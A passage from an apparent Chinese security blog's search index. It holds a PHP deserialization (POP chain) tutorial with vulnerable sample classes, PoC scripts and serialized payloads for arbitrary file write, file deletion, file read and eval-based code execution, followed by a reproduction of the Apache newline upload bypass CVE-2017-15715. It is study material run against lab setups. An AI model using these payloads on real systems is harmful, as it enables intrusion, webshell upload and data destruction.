class="string">&quot;%00test%00flag&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Active&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>是反序列化函数，若被序列化的变量是一个对象，重新构造对象之后会自动调用__wakeup成员函数</p><p>举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;test&#x27;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这串代码，我们可以看到变量<code>$a</code>从url中test参数获取到内容，并且在反序列化的时候通过<code>__destruct()</code>直接将传入的数据不经过任何处理，echo出来，这里就存在反射型xss漏洞了。</p><p>在反序列化中,我们所能控制的数据就是对象中的各个属性值,所以在PHP的反序列化有一种漏洞利用方法叫做 “面向属性编程” ,即 POP( Property Oriented Programming)。和二进制漏洞中常用的ROP技术类似。在ROP中我们往往需要一段初始化gadgets来开始我们的整个利用过程,然后继续调用其他gadgets。在PHP反序列化漏洞利用技术POP中,对应的初始化gadgets就是<code>__wakeup()</code> 或者是<code>__destruct()</code> 方法, 在最理想的情况下能够实现漏洞利用的点就在这两个函数中,但往往我们需要从这个函数开始,逐步的跟进在这个函数中调用到的所有函数,直至找到可以利用的点为止。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.unserialize函数的参数可控<br>2.存在魔法函数<br>总结几个常用魔术方法及触发条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h2 id="1-几个可用的POP链方法"><a href="#1-几个可用的POP链方法" class="headerlink" title="1.几个可用的POP链方法"></a>1.几个可用的POP链方法</h2><p>命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br></pre></td></tr></table></figure><p>文件操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure><p>如果在跟进程序过程中发现这些函数就要打起精神,一旦这些函数的参数我们能够控制,就有可能出现高危漏洞.</p><h2 id="2-POP链demo示例"><a href="#2-POP链demo示例" class="headerlink" title="2.POP链demo示例"></a>2.POP链demo示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;demo\n&quot;;</span><br><span class="line">    private $filename = &#x27;./demo&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(file_get_contents(&#x27;./serialized.txt));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这是一个很简单的示例代码，且这个代码存在反序列化漏洞。该文件还定义了一个 popdemo 类,并且该类实现了 <code>__wakeup</code> 函数,然后在该函数中又调用了save函数，且参数对象是文件名。跟进save函数，我们看到在该函数中通过调用<code>file_put_contents</code>函数，这个函数的<code>$filename</code>和<code>data</code>属性值是从save函数中传出来的，并且创建了一个文件。由于<code>__wakeup()</code>函数在序列化时自动调用，这里还定义了一个保存文件的函数，在这个反序列化过程中对象的属性值可控。于是这里就存在一个任意文件写入任意文件内容的反序列化漏洞了。这就是所谓的POP。就是关注整个函数的调用过程中参数的传递情况,找到可利用的点,这和一般的Web漏洞没什么区别,只是可控制的值有直接传递给程序的参数转变为了对象中的属性值。</p><p>利用poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;&lt;?php phpinfo();?&gt;\n&quot;;</span><br><span class="line">    private $filename = &#x27;./poc.php&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$demo = new popdemo();</span><br><span class="line">echo serialize($demo);</span><br><span class="line">file_put_contents(&quot;./serialized.txt&quot;,serialize($demo));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里定义了<code>$data</code>和<code>$filename</code>，然后序列化字符串后存储到serialized.txt文件中，序列化字符串：</p><p><img src="hao2m.png" alt="4"></p><p>然后运行demo代码，会在同目录下生成一个poc.php</p><p><img src="tzldu.png" alt="5"></p><h1 id="反序列化漏洞的利用"><a href="#反序列化漏洞的利用" class="headerlink" title="反序列化漏洞的利用"></a>反序列化漏洞的利用</h1><h2 id="1-利用构造函数等"><a href="#1-利用构造函数等" class="headerlink" title="1.利用构造函数等"></a>1.利用构造函数等</h2><p>php在使用unserialize()后会导致<code>__wakeup()</code> 或<code>__destruct()</code>的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<code>__wakeup()</code> 或<code>__destruct()</code>中，从而当我们控制序列化字符串时可以去直接触发它们。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class pocdemo&#123;</span><br><span class="line">    function __construct($test)&#123;</span><br><span class="line">        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">        fwrite($fp,$test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;123&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = file_get_contents(&#x27;./ser.txt&#x27;);</span><br><span class="line">unserialize($test);</span><br><span class="line"></span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里代码主要是通过get方法通过test传入序列化好的字符串，然后在反序列化的时候自动调用<code>__wakeup()</code>函数，在<code>__wakeup()</code>函数中通过new pocdemo()会自动调用对象pocdemo中的<code>__construct()</code>，从而把<code>&lt;?php phpinfo(); ?&gt;</code>写入到shell.php中。</p><p>poc代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ser = new l1nk3r();</span><br><span class="line">$result = serialize($ser);</span><br><span class="line">print $result;</span><br><span class="line">file_put_contents(&#x27;./ser.txt&#x27;,$result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/php反序列化漏洞总结/pu7ob.png" alt="6">然后将这个序列化的字符重新导入到poc代码中，反序列化之后，就会生成一个shell.php,并且内容为<code>&lt;?php phpinfo(); ?&gt;</code></p><p><img src="4g1pi.png" alt="7"></p><p>存在漏洞的思路：一个类用于临时将日志储存进某个文件，当__destruct被调用时，日志文件将会被删除，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class logfile</span><br><span class="line">&#123;</span><br><span class="line">    //log文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //一些用于储存日志的代码</span><br><span class="line">    public function logdata($text)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;log data:&#x27;.$text.&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">        file_put_contents($this-&gt;filename,$text,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    //destrcuctor 删除日志文件</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;__destruct deletes &#x27;.$this-&gt;filename.&#x27;file.&lt;br /&gt;&#x27;;</span><br><span class="line">        unlink(dirname(__FILE__).&#x27;/&#x27;.$this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//test5.php</span><br></pre></td></tr></table></figure><p>调用这个类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test5.php&#x27;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    //类数据</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //输出数据</span><br><span class="line">    public function printdata()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;User &#x27;.$this-&gt;name.&#x27; is&#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//重建数据</span><br><span class="line">$usr = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">//一个示例代码</span><br></pre></td></tr></table></figure><p>GET[‘usr_serialized’]);$_GET[‘usr_serialized’]是可控的，那么我们就可以构造输入删除任意文件<br>构造输入删除目录下的index.php文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;test5.php&#x27;;</span><br><span class="line">$object = new logfile();</span><br><span class="line">$object-&gt;filename = &#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($object).&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">//test7.php</span><br></pre></td></tr></table></figure><p>接下来先进入index.php：</p><p>接下来尝试使用test7.php删除了index.php，进入test7.php:<br>现在在目录里已经没有了index.php:</p><p>我们再次访问一下test7.php试一试：</p><p>index.php已经没有了。<br>这是一个简单的示例。</p><p>常见的注入点<br>上一部分展示了由于输入可控造成的__destruct函数删除任意文件，其实问题也可能存在于__wakeup、__sleep、__toString等其他magic函数，一切都取决于程序逻辑。比如，某用户类定义了一个__toString，为了让应用程序能够将类作为一个字符串输出（echo $object），而且其他类也可能定义了一个类允许__toString读取某个文件。<br>现在开始这个小实验，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test9.php&#x27;;</span><br><span class="line">$fileobj = new fileclass();</span><br><span class="line">$fileobj-&gt;filename = &#x27;hello.txt&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($fileobj);</span><br><span class="line">?&gt;</span><br><span class="line">//test8.php</span><br></pre></td></tr></table></figure><p>我们先访问test8.php，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class fileclass</span><br><span class="line">&#123;</span><br><span class="line">    //文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //当对象被作为一个字符串会读取这个文件</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class user</span><br><span class="line">&#123;</span><br><span class="line">    //class data</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //允许对象作为一个字符串输出上面的data</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;user &#x27;.$this-&gt;name.&#x27; is &#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//用户可控</span><br><span class="line">$obj = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">//输出__toString</span><br><span class="line">echo $obj</span><br><span class="line">?&gt;</span><br><span class="line">//test9.php</span><br></pre></td></tr></table></figure><p>接下来我们出发反序列化漏洞，获取hello.txt的内容：<br>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test9.php?usr_serialized=O:9:%22fileclass%22:1:&#123;s:8:%22filename%22;s:9:%22hello.txt%22;&#125;</span><br></pre></td></tr></table></figure><p>访问：<br>可以看到hello.txt的内容：</p><h2 id="2-利用普通成员方法"><a href="#2-利用普通成员方法" class="headerlink" title="2.利用普通成员方法"></a>2.利用普通成员方法</h2><p>在反序列化的时候，当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;CodeMonster&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从代码上来看，来通过new 实例化一个新的l1nk3r对象后，调用<code>__construct()</code>，其中该函数又new了一个新的CodeMonster对象；这个对象的功能是定义了action()函数，并且打印CodeMonster。然后结束的时候调用<code>__destruct()</code>,在<code>__destruct()</code>会调用action()，因此页面会输出CodeMonster。</p><p><img src="3igq4.png" alt="8"></p><p>但是在代码中，我们看得到codermaster1对象中有一个eval()函数，这可是危险函数啊，那有什么方法，通过发序列化触发它呢，当然有了。刚刚在l1nk3r对象中，new的是CodeMonster，如果new的是CodeMonster1，那么自然就会进入CodeMonster1中，然后eval()函数中的<code>$test2</code>可控制，那么自然就可以实现远程代码执行了。</p><p>Poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">print_r(serialize($class6));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>生成的序列化字符串：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;l1nk3r&quot;:1:&#123;s:4:&quot;test&quot;;O:11:&quot;CodeMonster1&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="2o48f.png" alt="9"></p><h1 id="查找反序列化漏洞及构造exploit的方法"><a href="#查找反序列化漏洞及构造exploit的方法" class="headerlink" title="查找反序列化漏洞及构造exploit的方法"></a>查找反序列化漏洞及构造exploit的方法</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>PHP的 unserialize() 函数只能反序列化在当前程序上下文中已经被定义过的类.在传统的PHP中你需要通过使用一大串的include() 或者 require()来包含所需的类定义文件。于是后来出现了 autoloading 技术,他可以自动导入需要使用的类,再也不需要程序员不断地复制粘贴 那些include代码了。这种技术同时也方便了我们的漏洞利用.因为在我们找到一个反序列化点的时候我们所能使用的类就多了,那么实现漏洞利用的可能性也就更加高。</p><p>还有一个东西要提一下,那就是Composer,这是一个php的包管理工具,同时他还能自动导入所以依赖库中定义的类。这样一来 unserialize() 函数也就能使用所有依赖库中的类了,攻击面又增大不少。</p><p>1.Composer配置的依赖库存储在vendor目录下</p><p>2.如果要使用Composer的自动类加载机制,只需要在php文件的开头加上</p><p><code>require __DIR__ . &#39;/vendor/autoload.php&#39;</code>;</p><h2 id="漏洞发现技巧"><a href="#漏洞发现技巧" class="headerlink" title="漏洞发现技巧"></a>漏洞发现技巧</h2><p>默认情况下 Composer 会从 Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。</p><p>找PHP链的基本思路.</p><p>1.在各大流行的包中搜索 <code>__wakeup()</code> 和 <code>__destruct()</code> 函数.</p><p>2.追踪调用过程</p><p>3.手工构造 并验证 POP 链</p><p>4.开发一个应用使用该库和自动加载机制,来测试exploit.</p><h2 id="构造exploit的思路"><a href="#构造exploit的思路" class="headerlink" title="构造exploit的思路"></a>构造exploit的思路</h2><p>1.寻找可能存在漏洞的应用</p><p>2.在他所使用的库中寻找 POP gadgets</p><p>3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload</p><p>4.将序列化之后的payload发送到有漏洞web应用中进行测试.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞总结 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-15715漏洞复现</title>
      <link href="/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/"/>
      <url>/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>Apache换行解析漏洞</strong></p><p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p><p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p><p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p><span id="more"></span><p>漏洞复现利用如下</p><p>打开环境即是个文件上传点</p><p><img src="image-20210723090110218.jpg" alt="image-20210723090110218"></p><p>先上潮汐看</p><p><img src="image-20210723090159097.jpg" alt="image-20210723090159097"></p><p>Apache</p><p>百度搜一波</p><p>我们利用CVE-2017-15715(Apache换行解析漏洞)</p><blockquote><p>此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照php 后缀进行解析，导致绕过一些服务器的安全策略。</p></blockquote><p>于是</p><p>上传一个php文件。注意，只能是<code>\x0A</code>，不能是<code>\x0D\x0A</code>，所以我们用hex功能在1.php后面添加一个<code>\x0A</code></p><p><img src="image-20210723090926609.jpg" alt="image-20210723090926609"></p><p>上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功</p><p>然后访问<code>/1.php%0A</code>，即可发现已经成功getshell</p><p><img src="image-20210723092640423.jpg" alt="image-20210723092640423"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从下水道尝试看懂php和练习</title>
      <link href="/2021/06/28/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/06/28/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
